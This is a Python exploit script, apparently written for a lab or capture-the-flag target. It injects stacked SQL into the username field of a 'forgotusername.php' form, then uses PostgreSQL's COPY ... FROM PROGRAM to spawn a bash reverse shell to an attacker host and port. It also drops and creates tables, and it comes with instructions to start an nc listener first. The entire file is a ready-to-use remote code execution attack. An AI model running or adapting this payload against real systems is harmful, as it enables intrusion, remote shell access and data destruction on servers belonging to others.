#!/usr/bin/python

'''
Instructions:
1. set USERNAME_LIST_FP
2. Run: nc -lvnp 5555
3. Run: python sqli-psql-rce.py
'''

import requests
import random
import string


url = 'http://10.25.1.7:80'

LHOST = '192.168.26.130'
LPORT = '443'
LPORT_RCE_SQLI = '5555'

proxies = {
	'http': '127.0.0.1:8080',
	'https': '127.0.0.1:8080'
}


def generate_random_string(length):
    characters = string.ascii_letters + string.digits
    random_string = ''.join(random.choice(characters) for _ in range(length))
    return random_string


def get_psql_rce_by_sqli(lhost, lport):
	rce_table = f"zz{generate_random_string(5).lower()}" # valid table name format

	sqli_queries = [
		"';",
		f"DROP TABLE IF EXISTS {rce_table};",
		f"CREATE TABLE {rce_table}(cmd text);",
		f"COPY {rce_table} FROM PROGRAM ",
		f"'echo \"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1\" | bash';",
		f"DROP TABLE IF EXISTS {rce_table}; -- "
	]

	injection_str = "".join(sqli_queries)
	print(f"[+] sending PSQL RCE SQLi payload: {injection_str}\n")
	data = {"username":injection_str}
	r = requests.post(f"{url}/forgotusername.php", data=data, proxies=proxies, verify=False)


def main():
	# RCE - SQLi -> run: nc -lvnp 5555
	get_psql_rce_by_sqli(LHOST, LPORT_RCE_SQLI)


if __name__ == "__main__":
	main()
